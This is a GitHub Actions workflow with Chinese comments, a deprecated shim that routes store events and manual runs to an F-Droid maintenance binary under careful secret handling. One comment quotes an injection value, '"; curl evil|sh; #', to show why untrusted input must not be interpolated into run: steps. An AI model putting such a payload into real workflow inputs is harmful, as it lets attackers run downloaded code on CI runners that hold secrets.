name: 旧入口（待删）

# ⚠️⚠️ **本文件是灰度的兼容壳，不是长期设计 —— 它整个要被删掉。**
#
# 拆工作流之后，forge 这边的每个功能有自己的入口文件（source-change.yml /
# intake-incoming.yml / reconcile.yml），路由落在**文件名 + 触发面**上，不再经 Go 里的
# 那个 switch。本文件留着只为一件事：`release` 事件跑的是 **tag 所指提交**上的 workflow
# 文件，而 `_incoming` 的 tag 引用一旦建立就不再动 —— 引用被 `cleanIncoming` 的
# `DeleteTagRef` 删掉并重建之前，Publish 那条路跑的仍是**旧提交上那份 `forward.yml`**，
# 它发出来的还是 `types: [store-event]`。所以这条监听必须活到**确认引用刷新过**之后。
#
# 顺序不可调换：先让 forge 同时听得懂新旧两套（第 2 步）→ 再让 store 改发新的（第 3 步）
# → 验一轮真搬运、并确认 `refs/tags/_incoming` 已 404（第 4 步）→ **这时才删本文件**
# （第 5 步，连同 `handle-dispatch` 动词、`FDROID_*` secrets）。详见 03 §4.7、README D65。
#
# ⚠️ **下面这段注释描述的是拆分前的世界**（`forward.yml` 与这里的 `verb` 同一套）：
# store 侧的 `forward.yml` **已经删了**，它的三个接任者各自只有自己的按钮、**没有 `verb`**。

# 触发面白名单（03 §4.2）。**不要加下面这几个**：
#
#   issues / issue_comment   —— forge 是公有仓库，任何登录用户都能触发，
#                               而 job 里带着能写 store 的 PAT。
#   pull_request_target      —— fork 可触发且带 secret + 读写 token，
#                               公有仓库最经典的泄密面。
#   release / push           —— forge 不承载数据，这两个事件在这里没有语义，
#                               白白扩大攻击面。store 侧的事件由 store 自己转发过来。
on:
  repository_dispatch:
    types: [store-event]
  # 手动按钮。§3.2 的搬运只有两种叫法（另一种是 store 侧上传 CI 发的信标），这是
  # 其中"人点"那一种 —— 队列常驻 draft，没有"发布即搬运"那条自动路了，所以人传完
  # 文件必须点一次按钮。
  #
  # ⚠️ 按钮在 store 侧也有一份，那是**日常入口**：人是在 store 的 Release 页面上传的
  # 文件，按钮就在同一页。这里这个留着是给改执行体的人调试用的，两边等效。
  # （拆分前 store 侧那份是 `forward.yml` 的 workflow_dispatch、与这里的 `verb` 同一套；
  # 拆分后它是 `intake-incoming.yml`、**没有 `verb`** —— 本文件的 `verb` 是旧壳自己留下的。）
  #
  # why choice 而不是自由文本：choice 的取值由 GitHub 服务端**先校验**（只可能是
  # 下面 options 里的字面量），到 job 里时已经是一个封闭集合的成员。它随后仍然
  # 走 env: 传下去、run: 里一个字都不插值 —— 和 store 侧同一个规矩，即使这里
  # 的输入来自界面而不是 issue 标题。
  workflow_dispatch:
    inputs:
      verb:
        description: 手动跑哪一件事
        type: choice
        options:
          - intake-incoming
          - reconcile
        default: intake-incoming

# 本仓库**只有 workflow，没有任何源码**，所以 GITHUB_TOKEN 一个权限都不需要：
# 执行体走 PAT 从 forge-core 拉，写 store 也走同一把 PAT（§6.2 不变量 1）——
# 而 PAT 权限是 per-repo 的，这里给得越小越好。
#
# ⚠️ `actions/cache` 不吃这个字段 —— 它用的是 runtime token，与 GITHUB_TOKEN 无关。
permissions: {}

# 所有会**写 store** 的 job 共用一个并发组，于是它们互相排队（见 reconcile.yml 里
# 同名的一组）。串行化的收益是消灭一整类竞态：两个事件同时往同一个 Release 传 asset、
# 或一个对账正推到一半另一个事件又推一次（非快进拒绝）。
#
# cancel-in-progress 必须是 false：这些 job 是**维护动作**，中途取消会留下
# "asset 传了一半、索引还没重建"的中间态。排队等一会儿是更好的代价。
# 一天也就几次事件，串行的代价约等于零。
#
# ⚠️ 这个组**同时**保护着下面那个 APK cache：两个写入口共用一盘 cache，
# 而 `actions/cache` 的"存"发生在 job 末尾 —— 两个 job 并发时，后存的那个
# 会拿着自己那份（可能已经过时的）目录覆盖掉先存的那份。串行 = 没有这个问题。
concurrency:
  group: store-write
  cancel-in-progress: false

jobs:
  handle:
    runs-on: ubuntu-latest
    # ⚠️ 与 reconcile.yml 同一个容器，理由也同一条：**两个动词都会走到
    # `fdroid update`** —— `intake-incoming` 在搬完 `_incoming` 之后调
    # `RebuildAndCheck`（见 cmd/forge/main.go），而那一步要 fdroidserver 重建索引、
    # 要 jarsigner 验签。少了容器，这两个动词会**在搬完文件之后**才失败，
    # 留下一个"asset 已经进 Release、索引却没跟着更新"的状态。
    #
    # ubuntu-latest 自带的 fdroidserver 2.2.1 解析现代 APK 会直接崩，
    # trixie 的才行（实测，见 reconcile.yml 里那段注释）。
    container:
      image: debian:trixie
    # ⚠️ 容器 job 的默认 shell 是 **sh（dash）**，Debian 基础镜像里没有 bash。
    defaults:
      run:
        shell: bash
    # 从 45 放宽到 120：**这个 job 与 reconcile 干的是同一件事** ——
    # `intake-incoming` 走完搬运之后照样要跑 `RebuildAndCheck`（下载缺失 APK、
    # 让 fdroidserver 解析整个 repo/、验签）。既然实务量一模一样，
    # 给一个更小的上界只会让它变成"随机地在某一轮红掉"。
    # 它是一个**上界**不是预留：正常一轮几秒到几分钟，只有真卡住时才会碰到它。
    timeout-minutes: 120
    env:
      # 上游 asset 名。action 按 **asset 原名**落盘、不改成别的名字，所以它同时
      # 就是本地文件名 —— 下面 `Make executable` 与各 run: 步骤都靠它拼路径。
      # ⚠️ 改这里要同时改 `Fetch executor` 的 `with.fileName`（两处必须一致）。
      EXEC_ASSET: forge-linux-amd64

      # ⚠️ **必须与 reconcile.yml 用同一盘 cache、同一个 key 前缀。**
      # 这里最容易想错的地方是"事件处理不碰索引，不需要 cache" —— 它碰。
      # 一条 `intake-incoming` 就是一个应用的新版本进索引，而索引里**其余**
      # 老版本的 APK 得在这一轮里凑齐：凑不齐它们就从索引里消失
      # （"只下最新版、老版本只从 cache 取"，见 03 §5.1）。
      # 少了 cache，一次搬运会把整个索引**缩小**到只剩最新版，然后推出去。
      APK_CACHE_DIR: ${{ github.workspace }}/apk-cache
    steps:
      # 与 reconcile.yml 完全同一份工具链，理由逐条相同（含那条最不显眼的
      # `git` —— 二进制靠它克隆并回写 store，而 Debian 基础镜像里没有 git）。
      # 这里不重复那一段注释，改动时**两个文件要一起改**。
      - name: Install the toolchain
        run: |
          set -euo pipefail
          apt-get update -qq
          apt-get install -y -qq --no-install-recommends \
            fdroidserver default-jdk-headless bash nodejs git \
            unzip jq curl ca-certificates

          {
            echo "### 环境"
            echo
            echo '| 工具 | 输出 |'
            echo '|---|---|'
            echo "| \`fdroid\` | $(fdroid --version 2>&1 | head -1) |"
            echo "| \`jarsigner\` | \`$(command -v jarsigner || echo '**不在 PATH**')\` |"
            echo "| \`git\` | $(git --version 2>&1) |"
            echo "| \`node\` | $(node --version 2>&1 | head -1) |"
            echo
          } >> "$GITHUB_STEP_SUMMARY"

      # 本 job **不 checkout 任何东西** —— 这里没有源码要取，而 store 是二进制
      # 自己浅克隆的（STORE_DIR 留空）。二进制的 git 封装用 `-c credential.helper=`
      # 一次性传凭据，token 不落盘。
      #
      # ⚠️ 但"不 checkout"**不再**等于"PAT 碰不到本 job"：取件改成 action 之后，
      # PAT 是作为 `with.token` 交给一段第三方代码的。这是本次换件的代价，记在
      # README 的「执行体从哪来」与 03 §4.5 第 11 条。
      #
      # ⚠️ 掩码**必须先于**它要覆盖的输出。`::add-mask::` 是 job 级生效的：本步
      # 注册之后，余下所有 step 的日志 —— **包括下面那个 action 自己打的** ——
      # 都会被遮蔽。换成 action 之后我们没法再在它的 `run:` 里发这一句（它没有
      # run:），所以拆成一个独立 step 放在它前面，而不是干脆不发。
      - name: Mask token
        env:
          MASK: ${{ secrets.GH_PAT }}
        run: echo "::add-mask::$MASK"

      # 与 reconcile.yml 同一盘 cache（同一个 key 前缀 `fdroid-apks-v1-`），
      # 于是两个写入口互相接力：一个搬完留下的 APK，另一个下一轮直接命中。
      # key 里同样带 `run_id`，保证每轮都**存一份新的**（见 reconcile.yml 里
      # 为什么必须是滚动 key 的那段）。
      - name: Restore the APK cache
        uses: actions/cache@v6
        with:
          path: ${{ env.APK_CACHE_DIR }}
          key: fdroid-apks-v1-${{ github.run_id }}
          restore-keys: |
            fdroid-apks-v1-

      - name: Fetch executor
        uses: robinraju/release-downloader@v1
        with:
          repository: market-of-labs/forge-core
          # 不钉 tag = **浮动取 latest**（刻意的，见 README「执行体从哪来」）。
          latest: true
          fileName: forge-linux-amd64
          # 只能是 $GITHUB_WORKSPACE 下的相对路径。本 job 没有 checkout，但那个
          # 目录 runner 已经建好了 —— 空着，正好放一个二进制。
          out-file-path: .
          # ⚠️ 不能吃默认值（默认是 `github.token`）：forge-core 是私有仓库，
          # GITHUB_TOKEN 跨不了仓库（§6.2 不变量 1）。
          token: ${{ secrets.GH_PAT }}

      - name: Make executable
        # Release asset 不带执行位，得自己补。路径落在 $GITHUB_WORKSPACE 而不是
        # 原来的 $RUNNER_TEMP —— 这个 action 只往工作目录里放东西。
        run: chmod +x "$GITHUB_WORKSPACE/$EXEC_ASSET"

      - name: Handle event
        env:
          # 一切外部数据只经 env 传入；run: 里是固定脚本文本（禁止 ${{ }} 插值）。
          # 这一条与 store 侧那几个入口文件是同一个理由：`${{ }}` 在 run: 里是
          # 文本拼接，issue 标题里放一个 `"; curl evil|sh; #` 就能执行。
          STORE_TOKEN: ${{ secrets.GH_PAT }}
          REPO_KEYSTORE_B64: ${{ secrets.REPO_KEYSTORE_B64 }}
          REPO_KEYSTORE_PASS: ${{ secrets.REPO_KEYSTORE_PASS }}
          REPO_KEY_PASS: ${{ secrets.REPO_KEY_PASS }}
          # 手动按钮时 client_payload 不存在，于是落到第一个分支（verb）。
          EVENT: ${{ github.event.inputs.verb || github.event.client_payload.event || github.event_name }}
          ISSUE: ${{ github.event.client_payload.issue }}
          SHA: ${{ github.event.client_payload.sha }}
          REF: ${{ github.event.client_payload.ref }}
        run: |
          set -euo pipefail
          # 这里**不再**掩码：上面那个 `Mask token` 步骤已经 job 级生效（同一把 PAT），
          # 而二进制启动后第一件事也是 env.AddMask()。再掩一次是纯重复。

          # 与 reconcile.yml 同一条现场证据：搬运这一轮里，索引中老版本的 APK
          # 是从 cache 凑出来的。这里是 0 就说明搬运会**缩小**索引（见上面那段）。
          mkdir -p "$APK_CACHE_DIR"
          echo "cache 目录 $APK_CACHE_DIR 里有 $(find "$APK_CACHE_DIR" -name '*.apk' | wc -l) 个 APK"

          "$GITHUB_WORKSPACE/$EXEC_ASSET" handle-dispatch

      # ⚠️ 这里**刻意没有** reconcile.yml 里那条「发布物核对」。
      # 理由不是省事：那一条验的是**签名指纹**，而指纹只由 keystore 决定 ——
      # 本 job 与 reconcile 用的是同一个 secret、同一个二进制，指纹不可能在这里
      # 换一把。把这套克隆 + 核对搬过来，只会让每一次人手点的维护动作都多花
      # 十几秒，去重复一件一天后就会自动被复核的事（下一次 reconcile）。
      #
      # 注意手动按钮时 client_payload 是空的，EVENT 就是上面那个 verb：
      # 默认的 intake-incoming = 搬一次队列（§3.2），选 reconcile = 全量对账（§4.3）。
      # 缺省值刻意选"搬队列"：手动点这个按钮的九成场景是刚往 _incoming 传完文件。
